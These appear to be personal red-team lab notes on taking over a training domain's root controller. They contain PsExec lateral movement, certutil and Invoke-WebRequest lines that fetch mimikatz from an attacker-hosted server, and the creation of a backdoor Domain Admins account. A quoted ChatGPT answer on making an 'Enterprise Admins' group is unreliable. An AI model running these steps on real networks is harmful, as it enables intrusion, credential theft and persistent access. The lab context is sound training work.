# Important
All sessions are under CORPDC rdp session. Through the `misc::cmd` session.

And pretty much none of below worked. The only way here is to reset the root\administrator password & bank\administrator. But not necessary. Especially the CORPDC can do the same in AD GUI after the golden ticket.

# Get flags
```powershell
echo "f52a9c36-4153-4ef9-84dd-1340070486fd" | Set-Content AlvinSmith.txt

mv AlvinSmith.txt \\ROOTDC.thereserve.loc\c$\Users\Administrator\AlvinSmith.txt
```

# Shell
https://github.com/A1vinSmith/pen-200-AD-labs/blob/f89bd05fee844c6f5f1ffddad38d47bfd742d6b8/Exercises/21.5.4/Q3/README.md?plain=1#L17

### PsExec
https://youtu.be/Td_Krk1S3yg?t=3768

```powershell
Invoke-WebRequest -Uri "http://10.200.113.12:9999/PsExec64.exe" -OutFile PsExec64.exe

# Better in powershell
PS C:\users\Administrator\Documents> .\PsExec64.exe \\ROOTDC.thereserve.loc powershell
PS C:\users\Administrator\Documents> .\psexec64.exe \\ROOTDC.thereserve.loc cmd.exe

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
ROOTDC

C:\Windows\system32>whoami
corp\administrator


PS C:\windows\temp\baturu> Get-Module -Name ActiveDirectory
e-oue-aeAtvDrco
ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...



PS C:\windows\temp\baturu> Import-Module ActiveDirectory

PS C:\windows\temp\baturu> Get-ADDomainController

ComputerObjectDN           : CN=ROOTDC,OU=Domain Controllers,DC=thereserve,DC=loc
DefaultPartition           : DC=thereserve,DC=loc
Domain                     : thereserve.loc
Enabled                    : True
Forest                     : thereserve.loc
HostName                   : ROOTDC.thereserve.loc
InvocationId               : a99e3f11-8027-45c6-80ba-7285f44d7f08
IPv4Address                : 10.200.113.100
IPv6Address                :
IsGlobalCatalog            : True
IsReadOnly                 : False
LdapPort                   : 389
Name                       : ROOTDC
NTDSSettingsObjectDN       : CN=NTDS Settings,CN=ROOTDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration
                             ,DC=thereserve,DC=loc
OperatingSystem            : Windows Server 2019 Datacenter
OperatingSystemHotfix      :
OperatingSystemServicePack :
OperatingSystemVersion     : 10.0 (17763)
OperationMasterRoles       : {SchemaMaster, DomainNamingMaster, PDCEmulator, RIDMaster...}
Partitions                 : {DC=ForestDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=thereserve,DC=loc,
                             CN=Schema,CN=Configuration,DC=thereserve,DC=loc, CN=Configuration,DC=thereserve,DC=loc...}
ServerObjectDN             : CN=ROOTDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=thereserve,DC
                             =loc
ServerObjectGuid           : e739b012-ff10-4fbe-8d85-1dd362d7a1c2
Site                       : Default-First-Site-Name
SslPort                    : 636

```

# Post Exploitation
### Mimikatz
```powershell
# Get it for root, just like how getting it on the CORPDC
$sourceUrl = "http://10.200.113.12:9999/mimikatz.exe"
Invoke-WebRequest -Uri $sourceUrl -OutFile baturu.exe
```

It didn't work, as we chose the `cmd.exe` for the `psexec`.

```cmd
certutil -urlcache -split -f "http://10.200.113.12:9999/mimikatz.exe" baturu.exe

certutil -urlcache -split -f "http://10.200.113.12:9999/mimikatz.exe" c:\windows\temp\baturu.exe
```

AV deletes them anyway.

### New Admin user on the ROOTDC
The shell has limitation. So go with this
```powershell
$Password = "Pwf41xc89!"
$AccountPassword = ConvertTo-SecureString -AsPlainText $Password -Force

New-ADUser -SamAccountName "batururoot1" -UserPrincipalName "batururoot1@rootdc.thereserve.loc" -Name "Baturu Root" -GivenName "Baturu1" -Surname "Root1" -Enabled $true -PasswordNeverExpires $true -AccountPassword $AccountPassword


cmdlet New-ADUser at command pipeline position 1
Supply values for the following parameters:
Name: batururoot

# Add the user to Domain Admins group
Add-ADGroupMember -Identity "Domain Admins" -Members "batururoot1"

# Add the user to Administrators group
Add-ADGroupMember -Identity "Administrators" -Members "batururoot1"

# Add the user to Enterprise Admins group (optional)
Add-ADGroupMember -Identity "Enterprise Admins" -Members "batururoot1"
# This one not working as expected.
Add-ADGroupMember : Cannot find an object with identity: 'Enterprise Admins' under: 'DC=corp,DC=thereserve,DC=loc'.
At line:1 char:1
+ Add-ADGroupMember -Identity "Enterprise Admins" -Members "batururoot"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Enterprise Admins:ADGroup) [Add-ADGroupMember], ADIdentityNotFoundException
    + FullyQualifiedErrorId : ActiveDirectoryCmdlet:Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException,Microsoft.ActiveDirector
   y.Management.Commands.AddADGroupMember

Add-ADGroupMember -Identity "Group Policy Creator" -Members "batururoot"
```

##### ChatGPT to get even "Enterprise Admins"
If the "Enterprise Admins" group is missing and you need to create a new one, you can use the following steps:

1. Open an elevated PowerShell session.
2. Import the Active Directory module using the command: `Import-Module ActiveDirectory`.
3. Run the command to create a new security group:
```powershell
New-ADGroup -Name "Enterprise Admins" -SamAccountName "Enterprise Admins" -GroupScope DomainLocal -GroupCategory Security
```
4. Verify that the group was created successfully by running the command:
```powershell
Get-ADGroup -Filter {Name -eq "Enterprise Admins"}
```
5. Once the group is created, you can add the desired user(s) as members using the `Add-ADGroupMember` command:
```powershell
Add-ADGroupMember -Identity "Enterprise Admins" -Members "batururoot1"
```

Please note that creating a new "Enterprise Admins" group should be done with caution, as it grants significant privileges within the Active Directory forest. It is recommended to involve your IT department or Active Directory administrator to ensure proper security and access control measures are followed.